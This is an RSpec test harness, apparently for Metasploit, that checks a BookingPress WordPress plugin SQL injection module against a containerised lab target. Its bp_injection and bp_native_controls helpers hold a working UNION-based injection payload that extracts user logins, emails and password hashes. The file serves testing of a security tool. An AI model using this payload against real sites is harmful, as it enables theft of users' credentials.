# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require_relative 'profiles'

RSpec.shared_context 'native BookingPress target' do
  include_context 'module target'

  before(:all) do
    @bp_profile = BookingpressProfiles.fetch
    @bp_native = { requests: [], commands: [], calls: [], reports: [], controls: [] }
    begin
      bp_counters('before')
      if @bp_profile.fetch('mode') == 'unrelated'
        expect(bp_request('/').body).to include('module-target-http-marker')
      else
        @bp_baseline = bp_identity
        bp_verify_identity
        bp_native_controls('before')
      end
      expect(bp_sql("SELECT count(*) FROM information_schema.tables WHERE table_schema='public'").strip).to eq('0')
      endpoint = target_endpoint('reporting_db')
      expect(console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)).not_to match(/\[-\]|Error|Exception/)
      expect(console_command('db_status')).to include('Connected to module_targets. Connection type: postgresql.')
      provenance = console_command('irb -e \'puts "BOOKINGPRESS_PROVENANCE=" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file("modules/auxiliary/gather/wp_bookingpress_category_services_sqli.rb").hexdigest}.to_json\'')
      @bp_native[:provenance] = JSON.parse(provenance.match(/^BOOKINGPRESS_PROVENANCE=(.+)$/)[1])
      expect(@bp_native[:provenance].fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(@bp_native[:provenance].fetch('owner_sha256')).to eq(Digest::SHA256.file("modules/#{BookingpressProfiles::OWNER}.rb").hexdigest)
      @bp_native[:preflight] = 'passed'
    ensure
      bp_save
    end
  end

  before do |example|
    @bp_workspace = 'bookingpress_' + example.metadata.fetch(:scoped_id).tr(':', '_')
    expect(console_command("workspace -a #{@bp_workspace}")).not_to include('[-]')
    expect(bp_reports).to eq([])
    console_command('back')
    expect(console_command("use #{BookingpressProfiles::OWNER}")).not_to match(/Failed to load|Unknown command|No results/)
  end

  after(:all) do
    if @bp_baseline
      bp_native_controls('after')
      expect(bp_identity).to eq(@bp_baseline)
      bp_verify_identity
    end
    expect(console_command('irb -e \'puts "BOOKINGPRESS_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('BOOKINGPRESS_STATE={"sessions":[],"jobs":[]}')
  ensure
    bp_counters('after')
    bp_save
  end

  def bp_prefix
    @bp_profile.fetch('prefix')
  end

  def bp_page
    return "#{bp_prefix}/?page_id=#{@bp_baseline.fetch('page').fetch('id')}" if @bp_profile['plain']

    "#{bp_prefix}/bookingpress/"
  end

  def bp_save
    return unless @bp_native

    File.write(File.join(target_runtime.fetch('artifacts'), 'native-bookingpress.json'), JSON.pretty_generate(@bp_native))
  end

  def bp_command(role, *arguments, user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '25', *arguments]
    output, error, status = Open3.capture3(*argv)
    @bp_native.fetch(:commands) << { argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exitstatus: status.exitstatus }
    bp_save
    raise "Native BookingPress command failed: #{role}: #{error}" unless status.success?

    output
  end

  def bp_identity
    JSON.parse(bp_command('app', 'php', '/opt/module-target/control.php', user: 'www-data'))
  end

  def bp_verify_identity
    identity = bp_identity
    @bp_native[:identity] = identity
    expect(identity.values_at('core', 'php', 'sapi', 'uid', 'prefix', 'table_prefix')).to eq(['5.2.4', '7.3.11', 'cli', 33, bp_prefix, @bp_profile.fetch('table_prefix')])
    expect(identity.fetch('page').values_at('content', 'status')).to eq(['[bookingpress_form]', 'publish'])
    expect(identity.fetch('group_concat_limit').to_i).to eq(@bp_profile.fetch('sql_limit')) if @bp_profile.key?('sql_limit')
    if @bp_profile.fetch('mode') == 'absent'
      expect(identity.values_at('active', 'active_plugins', 'plugin_version')).to eq([false, [], nil])
    else
      release = BookingpressProfiles::RELEASES.fetch(@bp_profile.fetch('release'))
      expect(identity.values_at('active', 'active_plugins', 'plugin_version')).to eq([true, ['bookingpress-appointment-booking/bookingpress-appointment-booking.php'], @bp_profile.fetch('release')])
      expect(identity.slice('archive_sha256', 'frontend_sha256', 'main_sha256')).to eq(release.slice('sha256', 'frontend_sha256', 'main_sha256').transform_keys { |key| key == 'sha256' ? 'archive_sha256' : key })
      expect(identity.fetch('categories').map { |row| row.fetch('bookingpress_category_id') }).to eq(['7'])
      expect(identity.fetch('services').map { |row| row.values_at('bookingpress_service_id', 'bookingpress_service_name') }).to eq([['11', 'Owned appointment service']])
    end
  end

  def bp_request(path, form: nil)
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 15
    request = form ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
    request.set_form_data(form) if form
    response = http.request(request)
    @bp_native.fetch(:requests) << { method: request.method, path: path, body_sent_base64: request.body && Base64.strict_encode64(request.body.b), code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    bp_save
    response
  ensure
    http&.finish if http&.started?
  end

  def bp_ajax(nonce, value)
    response = bp_request("#{bp_prefix}/wp-admin/admin-ajax.php", form: {
      'action' => 'bookingpress_front_get_category_services', '_wpnonce' => nonce,
      'category_id' => '7', 'total_service' => value
    })
    expect(response.code).to eq('200')
    JSON.parse(response.body)
  end

  def bp_injection(expression)
    "-1) UNION ALL SELECT (#{expression}),456,789,12,34,56,78,90,77-- -"
  end

  def bp_native_controls(phase)
    login = bp_request("#{bp_prefix}/wp-login.php")
    expect(login.code).to eq('200')
    expect(login.body).to include('name="log"', 'name="pwd"')
    page = bp_request(bp_page)
    expect(page.code).to eq('200')
    nonce = page.body.match(/action:'bookingpress_front_get_category_services'.*?_wpnonce:'([a-zA-Z0-9]+)'/m)&.[](1)
    if @bp_profile.fetch('mode') == 'absent'
      expect(nonce).to be_nil
      response = bp_request("#{bp_prefix}/wp-admin/admin-ajax.php", form: { 'action' => 'bookingpress_front_get_category_services' })
      expect(response.body).to eq('0')
    else
      expect(nonce).not_to be_nil
      expect(page.body).to include('Owned appointment service', 'Owned appointment category')
      ordinary = bp_ajax(nonce, '11')
      expect(ordinary.map { |row| row.fetch('bookingpress_service_name') }).to eq(['Owned appointment service'])
      expect(bp_ajax('module-target-invalid-nonce', '11').fetch('variant')).to eq('error')
      marker = 'module_target_native_' + phase
      injected = bp_ajax(nonce, bp_injection('0x' + marker.unpack1('H*')))
      if @bp_profile.fetch('mode') == 'fixed'
        expect(injected).to eq([])
      else
        expect(injected.map { |row| row.fetch('bookingpress_service_id') }).to eq([marker])
        @bp_baseline.fetch('users').each do |user|
          expression = 'select hex(concat_ws(0x3b,user_login,user_email,user_pass)) from ' + @bp_profile.fetch('table_prefix') + 'users where ID=' + Integer(user.fetch('ID'), 10).to_s
          result = bp_ajax(nonce, bp_injection(expression))
          expect(result.length).to eq(1)
          expect([result.first.fetch('bookingpress_service_id')].pack('H*')).to eq(user.values_at('user_login', 'user_email', 'user_pass').join(';').b)
        end
      end
    end
    expect(bp_identity).to eq(@bp_baseline)
    @bp_native.fetch(:controls) << { phase: phase, mode: @bp_profile.fetch('mode'), status: 'passed' }
    bp_save
  end

  def bp_sql(query)
    bp_command('reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def bp_reports
    raise ArgumentError, 'Invalid BookingPress workspace' unless @bp_workspace.match?(/\Abookingpress_[0-9_]+\z/)

    rows = JSON.parse(bp_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.username),'[]'::json) FROM (
        SELECT p.username,s.data AS private_data,s.type,s.jtr_format,c.origin_type,o.module_full_name,
          service.name AS service,service.port,service.proto,host(h.address::inet) AS address
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id LEFT JOIN metasploit_credential_privates s ON s.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services service ON service.id=o.service_id LEFT JOIN hosts h ON h.id=service.host_id
        WHERE w.name='#{@bp_workspace}'
      ) row
    SQL
    @bp_native.fetch(:reports) << { workspace: @bp_workspace, rows: rows }
    bp_save
    rows
  end

  def bp_owner(options = {}, action: 'run', service: 'app')
    endpoint = target_endpoint(service)
    values = { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port'), 'SSL' => false, 'TARGETURI' => bp_page, 'VERBOSE' => true, 'HttpClientTimeout' => 5 }.merge(options)
    output = console_command("#{action} #{format_datastore_options(values)}", timeout: 90)
    @bp_native.fetch(:calls) << { workspace: @bp_workspace, action: action, service: service, options: values, output_base64: Base64.strict_encode64(output.b) }
    bp_save
    bp_reports
    expect(output).not_to match(/Exception|undefined method|Unknown command|Msf::OptionValidateError|LocalJumpError|unexpected return/)
    expect(output).to include('Auxiliary module execution completed') if action == 'run'
    output
  end

  def bp_success(options = {})
    output = bp_owner(options)
    expect(output).not_to match(/Auxiliary (?:failed|aborted)/)
    expect(output).to include('Wordpress User Credentials')
    users = @bp_baseline.fetch('users')
    users.each { |user| expect(output).to include(*user.values_at('user_login', 'user_email', 'user_pass')) }
    records = bp_reports
    expect(records.length).to eq(users.length)
    expect(records.to_h { |row| row.values_at('username', 'private_data') }).to eq(users.to_h { |user| user.values_at('user_login', 'user_pass') })
    endpoint = target_endpoint('app')
    records.each do |row|
      expect(row.values_at('type', 'jtr_format', 'origin_type', 'module_full_name', 'service', 'proto', 'address', 'port')).to eq(['Metasploit::Credential::NonreplayableHash', 'phpass', 'Metasploit::Credential::Origin::Service', BookingpressProfiles::OWNER, 'wordpress bookingpress plugin', 'tcp', endpoint.fetch('host'), endpoint.fetch('port')])
    end
    expect(bp_identity).to eq(@bp_baseline)
    output
  end

  def bp_refusal(options = {}, action: 'run', service: 'app')
    before = bp_reports
    output = bp_owner(options, action: action, service: service)
    expect(output).not_to include('Wordpress User Credentials')
    expect(bp_reports).to eq(before)
    expect(bp_identity).to eq(@bp_baseline) if @bp_baseline
    output
  end

  def bp_counters(phase)
    roles = @bp_profile.fetch('mode') == 'unrelated' ? %w[app reporting_db] : %w[app db reporting_db]
    values = roles.to_h do |role|
      counters = %w[memory.events pids.events].to_h do |name|
        numbers = target_exec(role, 'cat', "/sys/fs/cgroup/#{name}").lines.to_h do |line|
          key, value = line.split
          [key, Integer(value, 10)]
        end
        [name, numbers]
      end
      [role, counters]
    end
    File.write(File.join(target_runtime.fetch('artifacts'), "bookingpress-resources-#{phase}.json"), JSON.pretty_generate(values))
    values.each_value do |counters|
      expect(counters.fetch('memory.events').values_at('oom', 'oom_kill')).to eq([0, 0])
      expect(counters.fetch('pids.events').fetch('max')).to eq(0)
    end
  end
end
